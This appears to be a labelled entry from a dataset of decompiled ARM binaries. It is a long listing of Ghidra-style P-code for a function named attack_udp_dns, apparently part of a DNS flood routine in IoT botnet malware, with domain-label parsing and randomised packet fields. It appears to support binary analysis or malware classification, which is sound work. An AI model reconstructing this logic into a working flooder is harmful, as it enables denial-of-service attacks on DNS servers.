Label: 856
Function: attack_udp_dns
Architecture: arm
Source File: Unknown
Entry Point: 00019540

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021d, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3d, 4)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffec, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x65, 1) INT_EQUAL (unique, 0x43980, 1) , (const, 0x2e, 1)
 ---  CBRANCH (ram, 0x199cc, 1) , (register, 0x65, 1)
 ---  STORE (const, 0x1a1, 4) , (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffeb, 1)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x7f4, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x7f4, 4)
(stack, 0xffffffffffffffeb, 1) COPY (const, 0x0, 1)
(register, 0x2c, 1) INT_ADD (stack, 0xffffffffffffffea, 1) , (const, 0x1, 1)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffec, 4) , (const, 0x1, 4)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffff9c, 4) , (register, 0x2c, 4) , (const, 0x1, 4)
 ---  BRANCH (ram, 0x199d8, 1)
(register, 0x2c, 1) INT_ADD (stack, 0xffffffffffffffeb, 1) , (const, 0x1, 1)
(ram, 0x19cb0, 4) MULTIEQUAL (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) MULTIEQUAL (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffea, 1) MULTIEQUAL (register, 0x2c, 1) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (register, 0x2c, 1)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffec, 4) , (const, 0x1, 4)
(ram, 0x19cb0, 4) MULTIEQUAL (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) MULTIEQUAL (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffea, 1) MULTIEQUAL (stack, 0xffffffffffffffea, 1) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (register, 0x2c, 4)
(unique, 0x2280, 1) INT_SLESS (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffc4, 4)
 ---  CBRANCH (ram, 0x1997c, 1) , (unique, 0x2280, 1)
 ---  STORE (const, 0x1a1, 4) , (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffeb, 1)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x77b, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x77b, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffc4, 4) , (const, 0x2, 4)
(unique, 0x10000251, 4) PTRADD (stack, 0xffffffffffffff9c, 4) , (register, 0x2c, 4) , (const, 0x1, 4)
(register, 0x2c, 4) CAST (unique, 0x10000251, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x1, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x7a1, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (register, 0x2c, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x7a1, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x7a1, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x1000018b, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x7a8, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x7a8, 4)
(unique, 0x1000018b, 4) PTRSUB (stack, 0xffffffffffffff98, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x1, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x7b6, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x7b6, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x7b6, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x7bd, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x7bd, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffff98, 4) , (const, 0x2, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffff94, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x19cb0, 4) MULTIEQUAL (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) MULTIEQUAL (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4)
(stack, 0xffffffffffffff94, 4) MULTIEQUAL (stack, 0xffffffffffffff94, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffff98, 4) MULTIEQUAL (stack, 0xffffffffffffff98, 4) , (stack, 0xffffffffffffff98, 4)
(stack, 0xffffffffffffff9c, 4) MULTIEQUAL (stack, 0xffffffffffffff9c, 4) , (stack, 0xffffffffffffff9c, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffa0, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd3, 1) MULTIEQUAL (stack, 0xffffffffffffffd3, 1) , (stack, 0xffffffffffffffd3, 1)
(stack, 0xffffffffffffffd4, 2) MULTIEQUAL (stack, 0xffffffffffffffd4, 2) , (stack, 0xffffffffffffffd4, 2)
(stack, 0xffffffffffffffd6, 2) MULTIEQUAL (stack, 0xffffffffffffffd6, 2) , (stack, 0xffffffffffffffd6, 2)
(stack, 0xffffffffffffffd8, 2) MULTIEQUAL (stack, 0xffffffffffffffd8, 2) , (stack, 0xffffffffffffffd8, 2)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 2) MULTIEQUAL (stack, 0xffffffffffffffdc, 2) , (stack, 0xffffffffffffffdc, 2)
(stack, 0xffffffffffffffdf, 1) MULTIEQUAL (stack, 0xffffffffffffffdf, 1) , (stack, 0xffffffffffffffdf, 1)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffea, 1) MULTIEQUAL (stack, 0xffffffffffffffea, 1) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffff94, 4) , (unique, 0x10000221, 4)
 ---  CBRANCH (ram, 0x196fc, 1) , (unique, 0x2480, 1)
(unique, 0x10000221, 4) CAST (register, 0x28, 4)
(ram, 0x19cb0, 4) MULTIEQUAL (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) MULTIEQUAL (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4)
(stack, 0xffffffffffffff98, 4) MULTIEQUAL (stack, 0xffffffffffffff98, 4) , (stack, 0xffffffffffffff98, 4)
(stack, 0xffffffffffffff9c, 4) MULTIEQUAL (stack, 0xffffffffffffff9c, 4) , (stack, 0xffffffffffffff9c, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffa0, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd3, 1) MULTIEQUAL (stack, 0xffffffffffffffd3, 1) , (stack, 0xffffffffffffffd3, 1)
(stack, 0xffffffffffffffd4, 2) MULTIEQUAL (stack, 0xffffffffffffffd4, 2) , (stack, 0xffffffffffffffd4, 2)
(stack, 0xffffffffffffffd6, 2) MULTIEQUAL (stack, 0xffffffffffffffd6, 2) , (stack, 0xffffffffffffffd6, 2)
(stack, 0xffffffffffffffd8, 2) MULTIEQUAL (stack, 0xffffffffffffffd8, 2) , (stack, 0xffffffffffffffd8, 2)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 2) MULTIEQUAL (stack, 0xffffffffffffffdc, 2) , (stack, 0xffffffffffffffdc, 2)
(stack, 0xffffffffffffffdf, 1) MULTIEQUAL (stack, 0xffffffffffffffdf, 1) , (stack, 0xffffffffffffffdf, 1)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffea, 1) MULTIEQUAL (stack, 0xffffffffffffffea, 1) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(stack, 0xffffffffffffff94, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x19c88, 1)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffff94, 4) , (const, 0x4, 4)
(unique, 0x10000259, 4) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x2c, 4) CAST (unique, 0x10000259, 4)
(unique, 0x1000025d, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x1000025d, 4)
(unique, 0x1000019b, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(unique, 0x10000261, 4) PTRSUB (unique, 0x1000019b, 4) , (const, 0x8, 4)
(register, 0x2c, 4) CAST (unique, 0x10000261, 4)
(unique, 0x100001a3, 4) PTRADD (register, 0x2c, 4) , (const, 0x2, 4) , (const, 0x14, 4)
(unique, 0x10000265, 4) PTRSUB (unique, 0x100001a3, 4) , (const, 0x1, 4)
(register, 0x2c, 4) CAST (unique, 0x10000265, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffdc, 2)
(register, 0x65, 1) INT_EQUAL (register, 0x2c, 4) , (ram, 0x19cb0, 4)
 ---  CBRANCH (ram, 0x19ad8, 1) , (register, 0x65, 1)
(unique, 0x10000215, 4) COPY (unique, 0x10000269, 4)
(unique, 0x10000269, 4) CAST (register, 0x2c, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x2c8, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (register, 0x2c, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (register, 0x2c, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (register, 0x2c, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (register, 0x2c, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (unique, 0x10000215, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x2c8, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x2c8, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (unique, 0x70f00, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x2e2, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x2e2, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0x4, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd8, 2)
(ram, 0x19cb0, 4) MULTIEQUAL (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) MULTIEQUAL (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4)
(stack, 0xffffffffffffff94, 4) MULTIEQUAL (stack, 0xffffffffffffff94, 4) , (stack, 0xffffffffffffff94, 4)
(stack, 0xffffffffffffff98, 4) MULTIEQUAL (stack, 0xffffffffffffff98, 4) , (stack, 0xffffffffffffff98, 4)
(stack, 0xffffffffffffff9c, 4) MULTIEQUAL (stack, 0xffffffffffffff9c, 4) , (stack, 0xffffffffffffff9c, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffa0, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (unique, 0x10000215, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd3, 1) MULTIEQUAL (stack, 0xffffffffffffffd3, 1) , (stack, 0xffffffffffffffd3, 1)
(stack, 0xffffffffffffffd4, 2) MULTIEQUAL (stack, 0xffffffffffffffd4, 2) , (stack, 0xffffffffffffffd4, 2)
(stack, 0xffffffffffffffd6, 2) MULTIEQUAL (stack, 0xffffffffffffffd6, 2) , (stack, 0xffffffffffffffd6, 2)
(stack, 0xffffffffffffffd8, 2) MULTIEQUAL (stack, 0xffffffffffffffd8, 2) , (stack, 0xffffffffffffffd8, 2)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 2) MULTIEQUAL (stack, 0xffffffffffffffdc, 2) , (stack, 0xffffffffffffffdc, 2)
(stack, 0xffffffffffffffdf, 1) MULTIEQUAL (stack, 0xffffffffffffffdf, 1) , (stack, 0xffffffffffffffdf, 1)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffea, 1) MULTIEQUAL (stack, 0xffffffffffffffea, 1) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(register, 0x65, 1) INT_EQUAL (register, 0x2c, 4) , (ram, 0x19cb0, 4)
 ---  CBRANCH (ram, 0x19b00, 1) , (register, 0x65, 1)
